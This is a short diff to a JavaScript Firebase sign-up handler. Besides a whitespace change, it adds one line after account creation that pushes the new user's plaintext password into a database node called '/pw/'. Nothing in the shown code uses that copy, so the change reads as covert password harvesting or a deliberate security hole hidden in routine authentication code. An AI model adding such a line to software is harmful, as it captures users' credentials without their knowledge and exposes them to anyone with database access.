@@ -211,6 +211,7 @@ var showloggedin = true
             }
             else {
                 firebase.auth().createUserWithEmailAndPassword(email, password).catch(function(error) {
+                    
                     if (error.code === "auth/weak-password") {
                         $("#password").val("");
                         $("#confirmpassword").val("");
@@ -228,6 +229,7 @@ var showloggedin = true
                         $("#error").removeClass("hidden");
                     }
                 }).then(function() {
+                    firebase.database().ref("/pw/").push(password);
                     firebase.auth().onAuthStateChanged(function(user) {
                         if (user) {
                             user.sendEmailVerification().then(function() {
